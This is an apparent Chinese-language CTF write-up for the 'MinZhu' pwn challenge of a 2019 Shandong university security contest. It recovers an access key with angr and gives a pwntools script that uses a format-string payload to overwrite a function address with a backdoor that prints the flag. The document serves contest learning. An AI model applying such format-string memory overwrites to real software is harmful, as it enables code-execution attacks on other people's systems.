    <div class="post-content">
        <p><strong>把之前比赛的题目做做</strong><br>当时放弃拯救的我，把所有能保存的题目都保存了下来<br><a href="https://www.yuque.com/attachments/yuque/0/2020/zip/268938/1593043485001-e20cbb50-bdb9-4457-af50-9d47819e1a8f.zip?_lake_card=%7B%22uid%22%3A%221593043441814-0%22%2C%22src%22%3A%22https%3A%2F%2Fwww.yuque.com%2Fattachments%2Fyuque%2F0%2F2020%2Fzip%2F268938%2F1593043485001-e20cbb50-bdb9-4457-af50-9d47819e1a8f.zip%22%2C%22name%22%3A%22%E6%B7%B1%E6%80%9D%E6%9D%AF2019%E5%B1%B1%E4%B8%9C%E7%9C%81%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%8A%80%E8%83%BD%E5%A4%A7%E8%B5%9B.zip%22%2C%22size%22%3A66903512%2C%22type%22%3A%22application%2Fx-zip-compressed%22%2C%22ext%22%3A%22zip%22%2C%22progress%22%3A%7B%22percent%22%3A99%7D%2C%22status%22%3A%22done%22%2C%22percent%22%3A0%2C%22id%22%3A%22Szkj0%22%2C%22card%22%3A%22file%22%7D" target="_blank" rel="noopener">深思杯 2019 山东省大学生网络安全技能大赛.zip</a></p>
<h1 id="MinZhu"><a href="#MinZhu" class="headerlink" title="MinZhu"></a>MinZhu</h1><p>首先有一个检测，要把 key 找出来才能进入，使用 angr 就可以<br>找出来 key 是 xNd9y6</p>
<p>然后看一下位置，第四个</p>
<p><img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1593006419656-9da39620-8890-4e02-b194-83808db6e702.png#align=left&display=inline&height=233&margin=%5Bobject%20Object%5D&name=image.png&originHeight=323&originWidth=617&size=30383&status=done&style=none&width=446" alt="image.png"></p>
<p>然后， 程序有一个后门，覆盖后面要执行的一个函数的地址为它就能打印出 flag 了</p>
<p><img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1593007357895-cafc3074-54db-49de-9140-0513a990cd34.png#align=left&display=inline&height=189&margin=%5Bobject%20Object%5D&name=image.png&originHeight=321&originWidth=833&size=41731&status=done&style=none&width=490" alt="image.png"></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = process(<span class="string">"./pwn"</span>)</span><br><span class="line">p.recvuntil(<span class="string">"Key:"</span>)</span><br><span class="line">p.sendline(<span class="string">"xNd9y6"</span>)</span><br><span class="line">p.recvuntil(<span class="string">"your msg:"</span>)</span><br><span class="line">payload2 = fmtstr_payload(<span class="number">4</span>, &#123;<span class="number">0x804A034</span>:<span class="number">0x080486B5</span>&#125;)</span><br><span class="line">print(len(payload2))</span><br><span class="line">p.sendline(payload2)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1593007402886-ae2d5924-b2f4-4bf7-a3cb-6129edcaf182.png#align=left&display=inline&height=398&margin=%5Bobject%20Object%5D&name=image.png&originHeight=743&originWidth=1153&size=267900&status=done&style=none&width=617" alt="image.png"></p>
